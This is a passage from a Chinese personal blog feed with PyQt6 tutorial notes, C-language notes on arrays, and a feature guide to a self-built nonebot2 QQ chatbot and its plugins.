<h3 id="UTC时间"><a href="#UTC时间" class="headerlink" title="UTC时间"></a>UTC时间</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PyQt6.QtCore <span class="keyword">import</span> QDateTime, Qt</span><br><span class="line"></span><br><span class="line">now = QDateTime.currentDateTime()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Local datetime: &#x27;</span>, now.toString(Qt.DateFormat.ISODate))              <span class="comment">#Local datetime:  2022-01-11T22:11:31</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Universal datetime: &#x27;</span>, now.toUTC().toString(Qt.DateFormat.ISODate))  <span class="comment">#Universal datetime:  2022-01-11T14:11:31Z</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;The offset from UTC is: <span class="subst">&#123;now.offsetFromUtc()&#125;</span> seconds&#x27;</span>)             <span class="comment">#The offset from UTC is: 28800 seconds</span></span><br><span class="line"><span class="comment">#本例获取了标准时间和本地时间。</span></span><br></pre></td></tr></table></figure>
<p>剩下的其他功能感觉用处不大。截个图备用</p>
<p><img src="https://c.img.dasctf.com/images/20221220/1671532079026-185e44ca-93d4-4628-b0ea-a32867c987c6.png" alt="image-20220111221613537"></p>
<p>留下链接</p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://maicss.gitbook.io/pyqt-chinese-tutoral/pyqt6/datetime#li-shi-zhan-yi">日期和时间</a></p>
<h2 id="第一个程序"><a href="#第一个程序" class="headerlink" title="第一个程序"></a>第一个程序</h2><h3 id="新建一个窗口"><a href="#新建一个窗口" class="headerlink" title="新建一个窗口"></a>新建一个窗口</h3><h4 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># file: simple.py</span></span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">ZetCode PyQt6 tutorial</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">In this example, we create a simple</span></span><br><span class="line"><span class="string">window in PyQt6.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Author: Jan Bodnar</span></span><br><span class="line"><span class="string">Website: zetcode.com</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> PyQt6.QtWidgets <span class="keyword">import</span> QApplication, QWidget</span><br><span class="line"><span class="comment">#基础小组件位于 PyQt6.QtWidgets 模块。</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line"></span><br><span class="line">    app = QApplication(sys.argv)</span><br><span class="line">	<span class="comment">#每个 PyQt6 应用程序都必须创建一个应用程序对象。sys.argv 参数是来自命令行的参数列表。Python 脚本可以从 shell 运行，这是应用启动的一种方式。</span></span><br><span class="line">    w = QWidget()</span><br><span class="line">    <span class="comment">#QWidget 小部件是 PyQt6 中所有用户界面对象的基类。我们为 QWidget 提供了默认构造函数。默认构造函数没有父级。没有父级的小部件称为窗口。</span></span><br><span class="line">    w.resize(<span class="number">250</span>, <span class="number">200</span>)</span><br><span class="line">    <span class="comment">#resize 方法改变了小部件的尺寸，现在它250像素宽，150像素高。</span></span><br><span class="line">    w.move(<span class="number">300</span>, <span class="number">300</span>)</span><br><span class="line">	<span class="comment">#move 方法把小部件移动到屏幕的指定坐标(300, 300)。</span></span><br><span class="line">    w.setWindowTitle(<span class="string">&#x27;Simple&#x27;</span>)</span><br><span class="line">    <span class="comment">#使用 setWindowTitle 给窗口设置标题，标题显示在标题栏</span></span><br><span class="line">    w.show()</span><br><span class="line">	<span class="comment">#show 方法是在屏幕上显示小部件的方法。显示一个部件的步骤是首先在内存里创建，然后在屏幕上显示。</span></span><br><span class="line">    sys.exit(app.<span class="built_in">exec</span>())</span><br><span class="line">    <span class="comment">#最后，我们进入应用程序的主循环。事件处理从这里开始。主循环从窗口系统接收事件并将它们分派给应用程序小部件。 如果我们调用 exit 方法或主小部件被销毁，则主循环结束。sys.exit 方法确保一个干净的退出。环境将被告知应用程序如何结束。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h3 id="创建一个气泡提示"><a href="#创建一个气泡提示" class="headerlink" title="创建一个气泡提示"></a>创建一个气泡提示</h3><h4 id="示例代码-1"><a href="#示例代码-1" class="headerlink" title="示例代码"></a>示例代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># file: tooltip.py</span></span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">ZetCode PyQt6 tutorial</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">This example shows a tooltip on</span></span><br><span class="line"><span class="string">a window and a button.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Author: Jan Bodnar</span></span><br><span class="line"><span class="string">Website: zetcode.com</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> PyQt6.QtWidgets <span class="keyword">import</span> (QWidget, QToolTip,</span><br><span class="line">    QPushButton, QApplication)</span><br><span class="line"><span class="keyword">from</span> PyQt6.QtGui <span class="keyword">import</span> QFont</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Example</span>(<span class="params">QWidget</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line"></span><br><span class="line">        self.initUI()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">initUI</span>(<span class="params">self</span>):</span></span><br><span class="line"></span><br><span class="line">        QToolTip.setFont(QFont(<span class="string">&#x27;SansSerif&#x27;</span>, <span class="number">10</span>))</span><br><span class="line">		<span class="comment">#这个静态方法给气泡提示框设置了字体，这里使用了10pt 的 SansSerif 字体。</span></span><br><span class="line">        self.setToolTip(<span class="string">&#x27;This is a &lt;b&gt;QWidget&lt;/b&gt; widget&#x27;</span>)</span><br><span class="line">		<span class="comment">#调用 setTooltip 方法创建气泡提示框，可以使用富文本内容。</span></span><br><span class="line">        btn = QPushButton(<span class="string">&#x27;Button&#x27;</span>, self)</span><br><span class="line">        btn.setToolTip(<span class="string">&#x27;This is a &lt;b&gt;QPushButton&lt;/b&gt; widget&#x27;</span>)</span><br><span class="line">        <span class="comment">#在气泡提示框上添加了一个按钮部件。</span></span><br><span class="line">        btn.resize(btn.sizeHint())</span><br><span class="line">        btn.move(<span class="number">50</span>, <span class="number">50</span>)</span><br><span class="line">		<span class="comment">#sizeHint 方法是给按钮一个系统建议的尺寸，然后使用 move 方法移动这个按钮的位置。</span></span><br><span class="line">        self.setGeometry(<span class="number">300</span>, <span class="number">300</span>, <span class="number">300</span>, <span class="number">200</span>)</span><br><span class="line">        self.setWindowTitle(<span class="string">&#x27;Tooltips&#x27;</span>)</span><br><span class="line">        self.show()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line"></span><br><span class="line">    app = QApplication(sys.argv)</span><br><span class="line">    ex = Example()</span><br><span class="line">    sys.exit(app.<span class="built_in">exec</span>())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h4 id="示例图片"><a href="#示例图片" class="headerlink" title="示例图片"></a>示例图片</h4><p><img src="https://c.img.dasctf.com/images/20221220/1671532087205-ee9e6d9c-52ad-4e2f-a657-5e5f327ebeaa.png" alt="image-20220201234745997"></p>
<p><img src="https://c.img.dasctf.com/images/20221220/1671532091494-ea620bbc-b348-4e79-a999-6c293b4b68b2.png" alt="image-20220201234817130"></p>
]]></content>
      <categories>
        <category>科创</category>
      </categories>
      <tags>
        <tag>pyqt6</tag>
      </tags>
  </entry>
  <entry>
    <title>C语言学习笔记之数组篇</title>
    <url>/2022/01/09/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%95%B0%E7%BB%84%E7%AF%87/</url>
    <content><![CDATA[<h1 id="数组篇"><a href="#数组篇" class="headerlink" title="数组篇"></a>数组篇</h1><p>循环部分因为有python基础，就快速的过一遍，不作详细记录。直接开始数组篇的学习了哦~</p>
<span id="more"></span>
<h2 id="一维数组"><a href="#一维数组" class="headerlink" title="一维数组"></a>一维数组</h2><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a><strong>问题</strong></h3><p>如何写一个程序计算用户输入的数字的平均数，并输出所有大于平均数的数？</p>
<h3 id="实验代码"><a href="#实验代码" class="headerlink" title="实验代码"></a>实验代码</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> x;</span><br><span class="line">	<span class="keyword">double</span> sum = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">//定义数组</span></span><br><span class="line">    <span class="keyword">int</span> number[<span class="number">100</span>];</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line">	<span class="keyword">while</span>( x!= <span class="number">-1</span> )&#123;</span><br><span class="line">		<span class="comment">//对数组中的元素赋值</span></span><br><span class="line">        number[cnt] = x;</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">int</span> i;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%d\t&quot;</span>, cnt);</span><br><span class="line">			<span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;=cnt; i++ )&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;%d\t&quot;</span>, number[i]);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">			</span><br><span class="line">		&#125;</span><br><span class="line">				</span><br><span class="line">		sum += x;</span><br><span class="line">		cnt ++;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (cnt &gt; <span class="number">0</span> )&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%f\n&quot;</span>, sum/cnt);</span><br><span class="line">		<span class="keyword">int</span> i ;</span><br><span class="line">		<span class="comment">//遍历数组</span></span><br><span class="line">        <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;cnt;i++)&#123;</span><br><span class="line">			<span class="comment">//使用数组中的元素</span></span><br><span class="line">            <span class="keyword">if</span> (number[i] &gt; sum/cnt)&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, number[i]);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/01/09/kAyqGXnPTxUwSo7.png" alt="image-20220109171512344"></p>
<h3 id="定义数组"><a href="#定义数组" class="headerlink" title="定义数组"></a>定义数组</h3><h4 id="语法格式"><a href="#语法格式" class="headerlink" title="语法格式"></a>语法格式</h4><p> &lt;类型&gt;变量名称[元素数量];</p>
<h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> grades[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">double</span> weight[<span class="number">20</span>];</span><br></pre></td></tr></table></figure>
<p>注：元素数量必须是整数</p>
<h3 id="什么是数组"><a href="#什么是数组" class="headerlink" title="什么是数组"></a>什么是数组</h3><ul>
<li><p>是一种容器（放东西的东西），特点是：</p>
<p>1、其中的元素具有相同的数据类型</p>
<p>2、一旦创建，不能改变大小</p>
<p>3、*（数组中的元素在内存中是连续依次排列的）</p>
</li>
</ul>
<h3 id="int-a-10"><a href="#int-a-10" class="headerlink" title="int a[10]"></a>int a[10]</h3><ul>
<li>一个int的数组</li>
<li>10个单元：a[0], a[1], a[2], … a[9]</li>
<li>每个单元就是一个int类型的变量</li>
<li>可以出现在赋值的左边或右边</li>
<li>*在赋值左边的叫做左值</li>
</ul>
<h3 id="数组的单元"><a href="#数组的单元" class="headerlink" title="数组的单元"></a>数组的单元</h3><ul>
<li>数组的每个单元就是数组类型的一个变量</li>
<li>使用数组时放在[]中的数字叫做下标或索引，下表从0开始计数</li>
</ul>
<h3 id="有效的下标范围"><a href="#有效的下标范围" class="headerlink" title="有效的下标范围"></a>有效的下标范围</h3><ul>
<li>编译器和运行环境都不会检查数组下标是否越界，无论是对数组单元做读还是写</li>
<li>一旦程序运行，越界的数组访问可能造成问题，导致程序崩溃</li>
<li>segmentation fault</li>
<li>所以这是程序员的责任来保证程序只使用有效的下标值：[0,数组的大小-1]</li>
</ul>
<h3 id="长度为0的数组（图一乐）"><a href="#长度为0的数组（图一乐）" class="headerlink" title="长度为0的数组（图一乐）"></a>长度为0的数组（图一乐）</h3><p>int a[0];</p>
<p>可以存在，但是没用啊。。。</p>
<h3 id="实例练习1"><a href="#实例练习1" class="headerlink" title="实例练习1"></a>实例练习1</h3><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>写一个程序，输入数量不确定的[0,9]范围内的整数，统计每一种数字出现的次数，输入-1表示结束。</p>
<h2 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h2><p>一个三行五列的矩阵</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a[<span class="number">3</span>][<span class="number">5</span>]</span><br></pre></td></tr></table></figure>
<h3 id="遍历二位数组"><a href="#遍历二位数组" class="headerlink" title="遍历二位数组"></a>遍历二位数组</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i=<span class="number">0</span>; i&lt;<span class="number">3</span>; i++ )&#123;</span><br><span class="line">	<span class="keyword">for</span> ( j=<span class="number">0</span>; j&lt;<span class="number">5</span>; j++)&#123;</span><br><span class="line">		a[i][j] = i*j;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="二维数组的初始化"><a href="#二维数组的初始化" class="headerlink" title="二维数组的初始化"></a>二维数组的初始化</h3><p><img src="https://c.img.dasctf.com/images/20221219/1671460082421-0f6c1c10-18e0-4495-9862-b45a5224075d.png" alt="image-20221219221744702"></p>
<h3 id="井字棋游戏实例"><a href="#井字棋游戏实例" class="headerlink" title="井字棋游戏实例"></a>井字棋游戏实例</h3><p><img src="https://c.img.dasctf.com/images/20221219/1671460382426-e684b8e7-ebf8-4795-b354-c5916d64b935.png" alt="image-20221219223248599"></p>
<p><img src="https://c.img.dasctf.com/images/20221219/1671460401459-83f59b68-80f7-46a7-bdac-197d749ae92b.png" alt="image-20221219223319614"></p>
]]></content>
      <categories>
        <category>基础课程学习</category>
      </categories>
      <tags>
        <tag>C语言</tag>
      </tags>
  </entry>
  <entry>
    <title>一只枫酱</title>
    <url>/2021/12/28/%E4%B8%80%E5%8F%AA%E6%9E%AB%E9%85%B1/</url>
    <content><![CDATA[<h1 id="枫酱的功能简介"><a href="#枫酱的功能简介" class="headerlink" title="枫酱的功能简介"></a>枫酱的功能简介</h1><p>自己搭的一个小bot，写一下功能说明书。（此bot为自己开发搭建，本人水平极其有限，插件大多为白嫖或二开，少部分原创）。功能仍在持续更新中。</p>
<p>1.25日更新：全架构更新，由nonebot2的a版本升级到了b版本。全插件更新，删除了抽卡、翻译插件（更新不了）。增加了更多的插件和功能。</p>
<span id="more"></span>
<h2 id="群聊-amp-私聊"><a href="#群聊-amp-私聊" class="headerlink" title="群聊&amp;私聊"></a>群聊&amp;私聊</h2><h3 id="B站推送"><a href="#B站推送" class="headerlink" title="B站推送"></a>B站推送</h3><h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://github.com/kanomahoro/nonebot-hanayori"><em>基于NoneBot2的B站动态推送与开播提醒插件</em> </a></p>
<h4 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h4><p>超级用户(主人)、群主、管理员、私聊</p>
<h4 id="使用格式"><a href="#使用格式" class="headerlink" title="使用格式"></a>使用格式</h4><p><strong>在群聊中使用格式</strong>：@机器人 指令 UID</p>
<p><strong>在私聊中使用格式</strong>：指令 UID</p>
<p><strong>所有指令如下：</strong></p>
<ol>
<li><strong>关注 UID</strong> 添加新主播，UID为主播的B站UID</li>
<li><strong>取关 UID</strong> 取关主播，UID为主播的B站UID</li>
<li><strong>列表</strong> 显示当前关注列表</li>
<li><strong>开启动态 UID</strong> 开启B站动态推送</li>
<li><strong>关闭动态 UID</strong> 关闭B站动态推送</li>
<li><strong>开启直播 UID</strong> 开启开播提醒</li>
<li><strong>关闭直播 UID</strong> 关闭开播提醒</li>
<li><strong>开启全体 UID</strong> 开启开播@全体成员</li>
<li><strong>关闭全体 UID</strong> 关闭开播@全体成员</li>
<li><strong>帮助</strong> 顾名思义</li>
</ol>
<h4 id="示例图"><a href="#示例图" class="headerlink" title="示例图"></a>示例图</h4><p><img src="https://s2.loli.net/2021/12/28/exHihP6n5op2Aqy.png" alt="image-20211228235235538"></p>
<p><img src="https://s2.loli.net/2021/12/28/mXp7Aj6i41wa2bQ.png" alt="123"></p>
<h3 id="沙雕图片"><a href="#沙雕图片" class="headerlink" title="沙雕图片"></a>沙雕图片</h3><h4 id="参考链接-1"><a href="#参考链接-1" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://github.com/MeetWq/nonebot-plugin-petpet">制作头像相关的表情包</a></p>
<h4 id="权限-1"><a href="#权限-1" class="headerlink" title="权限"></a>权限</h4><p>所有人</p>
<h4 id="使用格式-1"><a href="#使用格式-1" class="headerlink" title="使用格式"></a>使用格式</h4><ul>
<li>指令 + @user，如： 爬 @小Q</li>
<li>指令 + qq号，如：爬 123456</li>
<li>指令 + 自己，如：爬 自己</li>
<li>指令 + 图片</li>
</ul>
<h4 id="全部指令"><a href="#全部指令" class="headerlink" title="全部指令"></a>全部指令</h4><ul>
<li>摸、摸摸、rua</li>
<li>亲、亲亲</li>
<li>贴、贴贴、蹭、蹭蹭</li>
<li>顶、玩</li>
<li>拍</li>
<li>撕(很危险，不开放)</li>
<li>丢、扔</li>
<li>爬</li>
<li>精神支柱</li>
<li>一直</li>
<li>小天使</li>
<li>加载中</li>
<li>一样</li>
<li>不要靠近</li>
<li>玩游戏</li>
</ul>
<h4 id="示例图-1"><a href="#示例图-1" class="headerlink" title="示例图"></a>示例图</h4><p><img src="https://s2.loli.net/2021/12/28/IDzHLvUETn8qB9m.png" alt="image-20211228235543472"></p>
<p><img src="https://s2.loli.net/2021/12/28/3x9VL4KvQ8fBDYr.png" alt="img"></p>
<p><img src="https://s2.loli.net/2021/12/28/V7b9KwqriegvCJL.png" alt="image-20211228235645656"></p>
<h3 id="表情包生成"><a href="#表情包生成" class="headerlink" title="表情包生成"></a>表情包生成</h3><h4 id="参考链接-2"><a href="#参考链接-2" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://github.com/MeetWq/nonebot-plugin-memes">用于表情包制作</a></p>
<h4 id="权限-2"><a href="#权限-2" class="headerlink" title="权限"></a>权限</h4><p>所有人</p>
<h4 id="使用格式-2"><a href="#使用格式-2" class="headerlink" title="使用格式"></a>使用格式</h4><p>指令+文字。多段文字中间要加空格。（可以使用<code>表情包制作</code>关键词获取全部指令）</p>
<h4 id="全部指令-1"><a href="#全部指令-1" class="headerlink" title="全部指令"></a>全部指令</h4><p><img src="https://s2.loli.net/2022/01/26/EZqNIoelThGDSgC.png" alt="image-20220126224647434"></p>
<h4 id="示例图-2"><a href="#示例图-2" class="headerlink" title="示例图"></a>示例图</h4><p><img src="https://s2.loli.net/2021/12/28/f9QFwq82g6k7xXy.png" alt="image-20211228235848593"></p>
<p><img src="https://s2.loli.net/2021/12/29/IMgxpd3JWwDsoEz.png" alt="image-20211229000233636"></p>
<h3 id="emoji合成"><a href="#emoji合成" class="headerlink" title="emoji合成"></a>emoji合成</h3><p>如果下载出错，则是api连接失败，等等再玩。</p>
<h4 id="参考链接-3"><a href="#参考链接-3" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://github.com/MeetWq/nonebot-plugin-emojimix">适用于 nonebot2的 emoji 合成器</a></p>
<h4 id="权限-3"><a href="#权限-3" class="headerlink" title="权限"></a>权限</h4><p>所有人</p>
<h4 id="使用格式-3"><a href="#使用格式-3" class="headerlink" title="使用格式"></a>使用格式</h4><p>[emoji1]+[emoji2]</p>
<h4 id="示例图-3"><a href="#示例图-3" class="headerlink" title="示例图"></a>示例图</h4><p><img src="https://s2.loli.net/2022/01/26/MZNJtwbOjvfQr98.png" alt="image-20220126231118684"></p>
<h3 id="logo生成"><a href="#logo生成" class="headerlink" title="logo生成"></a>logo生成</h3><h4 id="参考链接-4"><a href="#参考链接-4" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://github.com/MeetWq/nonebot-plugin-logo">用于xxxxHub 等风格logo制作</a></p>
<h4 id="权限-4"><a href="#权限-4" class="headerlink" title="权限"></a>权限</h4><p>所有人</p>
<h4 id="使用格式-4"><a href="#使用格式-4" class="headerlink" title="使用格式"></a>使用格式</h4><p>指令+文字（注意有分段的要加空格）</p>
<h4 id="全部指令-2"><a href="#全部指令-2" class="headerlink" title="全部指令"></a>全部指令</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ph Porn Hub</span><br><span class="line">yt You Tube</span><br><span class="line">5000兆 我去 初音未来</span><br><span class="line">douyin douyin</span><br><span class="line">google Google</span><br></pre></td></tr></table></figure>
<h4 id="示例图-4"><a href="#示例图-4" class="headerlink" title="示例图"></a>示例图</h4><p><img src="https://s2.loli.net/2022/01/26/vWlkBGOp25zxXY4.png" alt="image-20220126232255742"></p>
<h3 id="人生重开模拟器"><a href="#人生重开模拟器" class="headerlink" title="人生重开模拟器"></a>人生重开模拟器</h3><h4 id="参考链接-5"><a href="#参考链接-5" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://github.com/MeetWq/nonebot-plugin-remake">适用于Nonebot2的人生重开模拟器</a></p>
<h4 id="权限-5"><a href="#权限-5" class="headerlink" title="权限"></a>权限</h4><p>所有人</p>
<h4 id="使用格式-5"><a href="#使用格式-5" class="headerlink" title="使用格式"></a>使用格式</h4><p>@枫酱 remake/liferestart/人生重开/人生重来</p>
<h4 id="示例图-5"><a href="#示例图-5" class="headerlink" title="示例图"></a>示例图</h4><p><img src="https://s2.loli.net/2022/01/26/VjKS3k6d9sz8lxa.jpg" alt="img"></p>
<h4 id="注"><a href="#注" class="headerlink" title="注"></a>注</h4><p>私聊模式下，没有群聊转发功能，会出现大段文字。下一个插件彩云小梦续写相同。</p>
<h3 id="AI续写"><a href="#AI续写" class="headerlink" title="AI续写"></a>AI续写</h3><h4 id="参考链接-6"><a href="#参考链接-6" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://github.com/MeetWq/nonebot-plugin-caiyunai">采用小梦续写</a></p>
<h4 id="权限-6"><a href="#权限-6" class="headerlink" title="权限"></a>权限</h4><p>所有人</p>
<h4 id="使用格式-6"><a href="#使用格式-6" class="headerlink" title="使用格式"></a>使用格式</h4><p>@机器人 续写/彩云小梦 xxx</p>
<h4 id="示例图-6"><a href="#示例图-6" class="headerlink" title="示例图"></a>示例图</h4><p><img src="https://s2.loli.net/2022/01/26/7zTqjiWrDfH3X6N.jpg" alt="img"></p>
<h3 id="网易云点歌"><a href="#网易云点歌" class="headerlink" title="网易云点歌"></a>网易云点歌</h3><h4 id="参考链接-7"><a href="#参考链接-7" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://github.com/maxesisn/nonebot_plugin_songpicker2">数据源为网易云音乐</a></p>
<h4 id="权限-7"><a href="#权限-7" class="headerlink" title="权限"></a>权限</h4><p>所有人</p>
<h4 id="使用格式-7"><a href="#使用格式-7" class="headerlink" title="使用格式"></a>使用格式</h4><p>点歌+歌曲名，从插件所给的候选项中选择歌曲。</p>
<h4 id="示例图-7"><a href="#示例图-7" class="headerlink" title="示例图"></a>示例图</h4><p><img src="https://s2.loli.net/2022/01/26/l7yZecAtj8O1naH.png" alt="image-20220126232857472"></p>
<h3 id="塔罗牌占卜"><a href="#塔罗牌占卜" class="headerlink" title="塔罗牌占卜"></a>塔罗牌占卜</h3><p>根据初代作者所说，塔罗牌准确度并不高，图一乐即可。群聊转发模式有bug，开启后会报错，暂时无法解决，只能一张一张地发。</p>
<h4 id="参考链接-8"><a href="#参考链接-8" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://github.com/KafCoppelia/nonebot_plugin_tarot">塔罗牌</a></p>
<h4 id="权限-8"><a href="#权限-8" class="headerlink" title="权限"></a>权限</h4><p>所有人</p>
<h4 id="使用格式-8"><a href="#使用格式-8" class="headerlink" title="使用格式"></a>使用格式</h4><p>塔罗牌/占卜</p>
<h4 id="示例图-8"><a href="#示例图-8" class="headerlink" title="示例图"></a>示例图</h4><p><img src="https://s2.loli.net/2022/01/26/VgmwliW96XJvRKT.png" alt="image-20220126230507765"></p>
<h3 id="AI聊天（原创）"><a href="#AI聊天（原创）" class="headerlink" title="AI聊天（原创）"></a>AI聊天（原创）</h3><p>采用腾讯云自然语言处理闲聊功能。</p>
<h4 id="权限-9"><a href="#权限-9" class="headerlink" title="权限"></a>权限</h4><p>所有人</p>
<h4 id="使用格式-9"><a href="#使用格式-9" class="headerlink" title="使用格式"></a>使用格式</h4><p>理论上应该是匹配“枫酱，”（中文逗号）。</p>
<p>但是莫名其妙出了bug，匹配“枫酱”亦可以运行。</p>
<p>不知道啥原因。。。建议第一种吧，不要去挑战bug。</p>
<p><strong>格式：</strong></p>
<p>枫酱，/枫酱+想说的话</p>
<h4 id="示例图-9"><a href="#示例图-9" class="headerlink" title="示例图"></a>示例图</h4><p><img src="https://s2.loli.net/2021/12/28/y3l5FuQWeodx1OS.png" alt="img"></p>
<h4 id="额外"><a href="#额外" class="headerlink" title="额外"></a>额外</h4><p>同样加入了输入的黑名单检测功能。请不要触发敏感词。具体请参考wordbank中的额外部分。</p>
<h3 id="wordbank（白嫖-深度二开）"><a href="#wordbank（白嫖-深度二开）" class="headerlink" title="wordbank（白嫖+深度二开）"></a>wordbank（白嫖+深度二开）</h3><p>哇，终于到这插件了。。。</p>
<h4 id="参考链接-9"><a href="#参考链接-9" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://github.com/Joenothing-lst/word-bank"><em>无数据库的轻量问答插件</em> </a></p>
<h4 id="权限（深度修改过）"><a href="#权限（深度修改过）" class="headerlink" title="权限（深度修改过）"></a>权限（深度修改过）</h4><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center"></th>
<th style="text-align:center">超级用户</th>
<th style="text-align:center">群主</th>
<th style="text-align:center">群管理</th>
<th style="text-align:center">私聊好友</th>
<th style="text-align:center">群好友</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">增加词条</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">×</td>
</tr>
<tr>
<td style="text-align:center">删除词条</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">×</td>
</tr>
<tr>
<td style="text-align:center">增加全局词条</td>
<td style="text-align:center">√</td>
<td style="text-align:center">×</td>
<td style="text-align:center">×</td>
<td style="text-align:center">×</td>
<td style="text-align:center">×</td>
</tr>
<tr>
<td style="text-align:center">删除全局词条</td>
<td style="text-align:center">√</td>
<td style="text-align:center">×</td>
<td style="text-align:center">×</td>
<td style="text-align:center">×</td>
<td style="text-align:center">×</td>
</tr>
<tr>
<td style="text-align:center">删除词库</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">×</td>
<td style="text-align:center">√</td>
<td style="text-align:center">×</td>
</tr>
<tr>
<td style="text-align:center">删除全局词库</td>
<td style="text-align:center">√</td>
<td style="text-align:center">×</td>
<td style="text-align:center">×</td>
<td style="text-align:center">×</td>
<td style="text-align:center">×</td>
</tr>
<tr>
<td style="text-align:center">删除全部词库</td>
<td style="text-align:center">√</td>
<td style="text-align:center">×</td>
<td style="text-align:center">×</td>
<td style="text-align:center">×</td>
<td style="text-align:center">×</td>
</tr>
</tbody>
</table>
</div>
<ul>
<li>注：私聊好友个人也可以建立属于自己的词库，与群词库是同级且独立的。</li>
</ul>
